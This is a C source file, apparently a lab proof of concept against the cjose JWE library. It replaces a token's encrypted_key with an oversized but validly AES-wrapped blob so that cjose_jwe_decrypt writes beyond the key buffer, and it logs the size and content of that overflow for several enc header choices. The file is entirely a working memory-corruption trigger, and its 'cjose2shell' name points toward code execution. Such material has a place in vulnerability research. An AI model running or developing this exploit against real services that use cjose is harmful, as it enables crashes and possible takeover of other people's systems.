/*
 * cjose2shell W197 — lab-only extension of driver.c: vary the attacker-
 * controlled "enc" header so the real set_cek() allocates 16/24/32/48/64
 * bytes, then send an oversized RFC 3394-valid wrapped encrypted_key through
 * real cjose_jwe_import()/cjose_jwe_decrypt(). No socket, listener, pointer
 * control or command. Uses only pinned upstream trees and the lab KEK.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <cjose/cjose.h>
#include <cjose/base64.h>
#include <cjose/error.h>
#include <openssl/aes.h>
#include <openssl/crypto.h>

/* lab instrumentation: pinned internal layout, only to read cek/cek_len */
#include "include/jwe_int.h"

static const char *JWK_OCT_16 = "{\"kty\":\"oct\", "
                                "\"k\":\"3921VrO5TrLvPQ-NFLlghQ\"}";
static const unsigned char KEK[16] = {
    0xdf, 0xdd, 0xb5, 0x56, 0xb3, 0xb9, 0x4e, 0xb2,
    0xef, 0x3d, 0x0f, 0x8d, 0x14, 0xb9, 0x60, 0x85
};

static const char *enc_for(const char *name, size_t *cek_len)
{
    if (!strcmp(name, "gcm128")) { *cek_len = 16; return CJOSE_HDR_ENC_A128GCM; }
    if (!strcmp(name, "gcm192")) { *cek_len = 24; return CJOSE_HDR_ENC_A192GCM; }
    if (!strcmp(name, "cbc256")) { *cek_len = 32; return CJOSE_HDR_ENC_A128CBC_HS256; }
    if (!strcmp(name, "cbc384")) { *cek_len = 48; return CJOSE_HDR_ENC_A192CBC_HS384; }
    if (!strcmp(name, "cbc512")) { *cek_len = 64; return CJOSE_HDR_ENC_A256CBC_HS512; }
    return NULL;
}

/* Replace encrypted_key with a valid RFC 3394 wrap of chosen bytes. */
static char *tamper(const char *compact, size_t cek_len, size_t extra)
{
    cjose_err err;
    memset(&err, 0, sizeof(err));
    uint8_t blob[1024];
    unsigned char pt[1016];
    size_t ek_len = cek_len + 8 + extra;
    if (ek_len > sizeof(blob) || ek_len - 8 > sizeof(pt)) return NULL;
    memset(pt, 0x5a, sizeof(pt));
    memcpy(pt + cek_len, "MISHE-ENC", 9);
    AES_KEY wkey;
    AES_set_encrypt_key(KEK, 128, &wkey);
    if (AES_wrap_key(&wkey, NULL, blob, pt, ek_len - 8) <= 0) return NULL;

    char *b64 = NULL;
    size_t b64_len = 0;
    if (!cjose_base64url_encode(blob, ek_len, &b64, &b64_len, &err)) return NULL;
    const char *d1 = strchr(compact, '.');
    const char *d2 = d1 ? strchr(d1 + 1, '.') : NULL;
    if (!d2) return NULL;
    size_t head = (size_t)(d1 - compact);
    size_t tail = strlen(d2);
    char *out = (char *)malloc(head + 1 + b64_len + tail + 1);
    if (!out) return NULL;
    memcpy(out, compact, head);
    out[head] = '.';
    memcpy(out + head + 1, b64, b64_len);
    memcpy(out + head + 1 + b64_len, d2, tail);
    out[head + 1 + b64_len + tail] = '\0';
    cjose_get_dealloc()(b64);
    return out;
}

int main(int argc, char **argv)
{
    const char *enc_name = (argc > 1) ? argv[1] : "gcm128";
    const char *scenario = (argc > 2) ? argv[2] : "safe";
    setbuf(stdout, NULL);
    size_t cek_len = 0;
    const char *enc = enc_for(enc_name, &cek_len);
    if (!enc) { printf("BAD_ENC=%s\n", enc_name); return 2; }
    size_t extra = 0;
    if (!strcmp(scenario, "safe")) extra = 0;
    else if (!strcmp(scenario, "oob8")) extra = 8;
    else if (!strcmp(scenario, "oob16")) extra = 16;
    else if (!strcmp(scenario, "oobbig")) extra = 1024 - 8 - cek_len;
    else { printf("BAD_SCENARIO=%s\n", scenario); return 2; }

    cjose_err err;
    memset(&err, 0, sizeof(err));
    cjose_jwk_t *jwk = cjose_jwk_import(JWK_OCT_16, strlen(JWK_OCT_16), &err);
    if (!jwk) { printf("JWK_FAIL=%d\n", err.code); return 2; }

    cjose_header_t *hdr = cjose_header_new(&err);
    cjose_header_set(hdr, CJOSE_HDR_ALG, CJOSE_HDR_ALG_A128KW, &err);
    cjose_header_set(hdr, CJOSE_HDR_ENC, enc, &err);
    const char *plain = "Setec Astronomy";
    cjose_jwe_t *good = cjose_jwe_encrypt(jwk, hdr, (const uint8_t *)plain,
                                          strlen(plain), &err);
    if (!good) { printf("ENCRYPT_FAIL=%d\n", err.code); return 2; }
    char *compact = cjose_jwe_export(good, &err);
    if (!compact) { printf("EXPORT_FAIL=%d\n", err.code); return 2; }

    char *token = compact;
    if (extra != 0) {
        token = tamper(compact, cek_len, extra);
        if (!token) { printf("TAMPER_FAIL\n"); return 2; }
    }
    printf("W197 ENC=%s CEK_EXPECT=%zu SCENARIO=%s EXTRA=%zu\n",
           enc_name, cek_len, scenario, extra);

    cjose_jwe_t *jwe = cjose_jwe_import(token, strlen(token), &err);
    printf("IMPORT=%d ERRCODE=%d\n", jwe != NULL, err.code);
    if (!jwe) return 3;
    size_t raw_len = jwe->to[0].enc_key.raw_len;
    printf("CEK_LEN_BEFORE=%zu EK_RAW_LEN=%zu\n", jwe->cek_len, raw_len);

    /* Independent transform: the bytes OpenSSL will write, from lab memory. */
    unsigned char inbuf[2048], outbuf[2048];
    memset(inbuf, 0, sizeof(inbuf));
    memset(outbuf, 0, sizeof(outbuf));
    int unwrap_rc = 0;
    if (raw_len && raw_len <= sizeof(inbuf)) {
        AES_KEY akey;
        AES_set_decrypt_key(KEK, 128, &akey);
        memcpy(inbuf, jwe->to[0].enc_key.raw, raw_len);
        unwrap_rc = AES_unwrap_key(&akey, NULL, outbuf, inbuf, raw_len);
    }
    int expected = (raw_len >= 8) ? (int)(raw_len - 8) : 0;
    printf("EXPECTED_WRITE_LEN=%d UNWRAP_RC=%d EXPECTED_BYTE_AT_CEK=%02x\n",
           expected, unwrap_rc,
           expected > (int)cek_len ? outbuf[cek_len] : 0);

    size_t plain_len = 0;
    memset(&err, 0, sizeof(err));
    uint8_t *dec = cjose_jwe_decrypt(jwe, jwk, &plain_len, &err);
    printf("DECRYPT=%d ERRCODE=%d PLAIN_LEN=%zu\n", dec != NULL, err.code, plain_len);
    printf("CEK_LEN_AFTER=%zu\n", jwe->cek_len);
    if (dec && plain_len == strlen(plain) && !memcmp(dec, plain, plain_len))
        printf("PLAIN_MATCH=1\n");
    else
        printf("PLAIN_MATCH=0\n");

    if (dec) cjose_get_dealloc()(dec);
    cjose_jwe_release(jwe);
    if (token != compact) free(token);
    cjose_get_dealloc()(compact);
    cjose_header_release(hdr);
    cjose_jwe_release(good);
    cjose_jwk_release(jwk);
    return 0;
}
